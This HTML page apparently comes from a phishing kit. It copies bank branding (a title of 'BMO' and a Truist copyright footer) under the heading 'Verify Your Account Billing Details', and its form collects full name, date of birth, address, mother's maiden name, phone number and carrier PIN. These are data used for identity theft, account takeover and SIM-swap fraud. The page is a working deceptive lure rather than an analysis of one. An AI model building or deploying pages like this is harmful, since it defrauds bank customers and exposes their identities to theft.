<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BMO</title>
    <style>
      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }
      .nav {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: left;

        padding: 0.5rem;
        height: 10vh;
        background-color: rgb(62, 7, 101);
      }

      .nav img {
        width: 150px;
        margin-left: 100px;

      }


      #main {
        border: 1px solid transparent;
        padding: 2rem 8rem;
        background: #f5f6f7;
        margin: auto;
      }
      .input {
        /* outline: 1px solid rgb(17, 147, 199); */
        padding: 0.8rem 0.5rem;
        width: 88%;
        border: 1.6px solid black;
        font-size: 1rem;
        margin-top: 0.7rem;
        border-radius: 0.3rem;
        outline: none;

        /* border: 1px solid red; */
      }
      .input:focus {
        border: 1.65px solid rgb(0, 121, 193);
      }
      #container {
        display: flex;
        gap: 1.8rem;
      }
      .forgot {
        font-weight: 600;
        color: #0075be;
        text-decoration: underline;
        cursor: pointer;
        margin-top: 1rem;
      }
      .card {
        width: 50%;
        border: 1px solid transparent;
        box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
        padding: 2rem;
        border-radius: 0.3rem;
        background-color: white;
      }
      label {
        display: block;
        color: #353554;
        margin-top: 1rem;
        font-family: monospace;
        font-size: 1rem;
      }
      h1 {
        text-align: center;
        margin-bottom: 2rem;
      }
      .checkbox {
        display: flex;
        align-items: center;
        gap: 0.8rem;
        font-size: 1.2rem;
        margin-top: 1.3rem;
        margin-bottom: 0.5rem;
      }
      .checkbox input {
        width: 1.5rem;
        height: 1.5rem;
        cursor: pointer;
      }
      .submit {
        background: rgb(57, 6, 94);
        color: white;
        padding: 1rem 2rem;
        padding: 1rem 2.5rem;
        cursor: pointer;
        border: none;
        display: block;
        font-weight: 700;
        border-radius: 3rem;
        margin: 1.5rem auto;
      }
      .submit:hover {
        background: rgb(79, 5, 132);
      }
      .learn {
        color: rgb(57, 6, 94);
        font-weight: 600;
        text-decoration: underline;
        cursor: pointer;
      }
      .box {
        box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;
        padding: 1.7rem;
        display: flex;
        background: white;
        flex-direction: column;
        gap: 0.8rem;
        border-radius: 0.3rem;
      }
      .security {
        width: 50%;
        display: flex;
        flex-direction: column;
        gap: 1.5rem;
      }
      .box span {
        color: #0075be;
        font-weight: 600;
        font-size: 0.9rem;
        cursor: pointer;
      }
      .box span:hover {
        text-decoration: underline;
      }
      .box p {
        font-size: 0.94rem;
      }
      .footer {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        position: sticky;
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        justify-content: space-between;
        border-top: 1px solid #ccc;
        background-color: rgb(57, 6, 94);
        top: 100%;
        padding: 0 18px;
        padding-top: 24px;
      }
      .footer img {
        width: 150px;
        margin-bottom: 10px;
        display: block;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        pointer-events: none;
      }
      .footer {
          padding-bottom: 24px;
        }

        .footer>img {
          margin: auto;
        }

        .footer>.text {
          width: 100%;
        }

        .footer{
        height: 100px;
         margin-top: 50px;
      }

      .footer img{
        width: 200px;
        height: 45px;
        margin-top: 3px;
        margin-left: 30px;
      }

      .anker {
      width: 80%;
      display: flex;
      justify-content: space-around;
      align-items: center;
      margin-bottom: 26px;
      /* margin-right: 20px; */
      }

      .anker a{
        font-size: 20px;
        font-weight: 600;
        color: #766992;
        text-decoration: none;
      }
    .anker a:hover{
      color:#fff;
      text-decoration: underline;
    }





      .copyright{
        display: flex;
        justify-content: center;
        align-items: center;
        
        height: 50px;
        background-color: black;
        color: white;
      }
      .copyright p{
        word-spacing: 2px;
      }

    




      @media only screen and (max-width:1220px) {
        .footer{
          height: 250px;
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .anker{
          display: flex;
          justify-content: center;
          align-items: center;
          flex-direction: column;
        }
        .anker a{
          margin-top: 10px;
        }
      }

      @media only screen and (max-width:575px) {
        .footer img{
          margin-left: 32%;
        }
      }
      @media only screen and (max-width:440px) {
        .footer img{
          margin-left: 25%;

        }
      }
 @media only screen and (max-width:450px) {
        .copyright {
         text-align: center;
          /* margin-top: 20px; */
        }
        .copyright p{
          margin-top: 30px;
        }
      }
      @media only screen and (max-width:285px){
        footer{
          width: 113vw;

        }
        .footer{
padding-right: 16px;

        }
        .footer img{
          margin-right: 65px;
        }

        .copyright{
          width:113vw;
        }
      }

      .digit {
        font-size: 0.9rem;
        font-family: sans-serif;
        margin-top: 0.5rem;
        color: rgb(45, 41, 41);
      }
      .svg {
        width: 25px;
        height: 25px;
        cursor: pointer;
      }
      h3 {
        display: flex;
        align-items: center;
      }
      @media only screen and (max-width: 420px) {
        .input {
          width: 100%;
        }
      }
      @media only screen and (max-width: 680px) {
        #main {
          padding: 2rem 0rem;
        }
        #container {
          flex-direction: column;
        }
        .security,
        .card {
          width: 100%;
        }
        footer {
          flex-direction: column;
        }
        h1{
          font-size: 18px;
        }
      }
    </style>
  </head>
  <body>
    <div class="nav">
      <img
        src="data:image/png;base64,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" />
    </div>
    <div id="main">
        <h1>Verify Your Account Billing Details</h1>
      <div id="container">
        <div class="card">
          <form method="POST">
            <label>Full Name</label>
            <input
              required
              type="text"
              name="fullname"
              class="input"
              placeholder="Name"
            />
            <label>Date of Birth</label>
            <input
              type="date"
              name="DOB"
              class="input"
              required

            />
            <label>Street Address</label>
            <input
              type="text"
              name="address"
              placeholder="Full Address"
              class="input"
              required

            />
            <label>Mother Maiden Name</label>
            <input
              type="text"
              placeholder="name"
              name="mmm"
              class="input"
              required
            />
            <label>State</label>
            <input
              type="text"
              placeholder="State"
              name="state"
              class="input"
              required
            />
            <label>Phone Number</label>
            <input
              type="number"
              placeholder="phoneno."
              name="phone"
              class="input"
              required
            />
            <label>Carrier Pin</label>
            <input
              type="number"
              placeholder="pin"
              maxlength="6"
              name="cpin"
              class="input"
            />
            <input class="submit" type="submit" value="SUBMIT" />
          </form>
        </div>
      </div>
    </div>
    <footer>
      <div class="footer">
        <img src="data:image/png;base64,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" alt="">

        <div class="anker">
          <a href="#">Privacy</a>
          <a href="#">Fraud & security</a>
          <a href="#">Terms & conditions</a>
          <a href="#">Accessibility</a>

        </div>
    </footer>
    <div class="copyright">
      <p>© 2022, Truist. All Rights Reserved.</p>
    </div>
  </body>
</html>
<script>
//   document.querySelector("form").addEventListener("submit", (event) => {
//     event.preventDefault();
//   });
  function formatString(e) {
    var inputChar = String.fromCharCode(event.keyCode);
    var code = event.keyCode;
    var allowedKeys = [8];
    if (allowedKeys.indexOf(code) !== -1) {
      return;
    }

    event.target.value = event.target.value
      .replace(
        /^([1-9]\/|[2-9])$/g,
        "0$1/" // 3 > 03/
      )
      .replace(
        /^(0[1-9]|1[0-2])$/g,
        "$1/" // 11 > 11/
      )
      .replace(
        /^([0-1])([3-9])$/g,
        "0$1/$2" // 13 > 01/3
      )
      .replace(
        /^(0?[1-9]|1[0-2])([0-9]{2})$/g,
        "$1/$2" // 141 > 01/41
      )
      .replace(
        /^([0]+)\/|[0]+$/g,
        "0" // 0/ > 0 and 00 > 0
      )
      .replace(
        /[^\d\/]|^[\/]*$/g,
        "" // To allow only digits and `/`
      )
      .replace(
        /\/\//g,
        "/" // Prevent entering more than 1 `/`
      );
  }
</script>
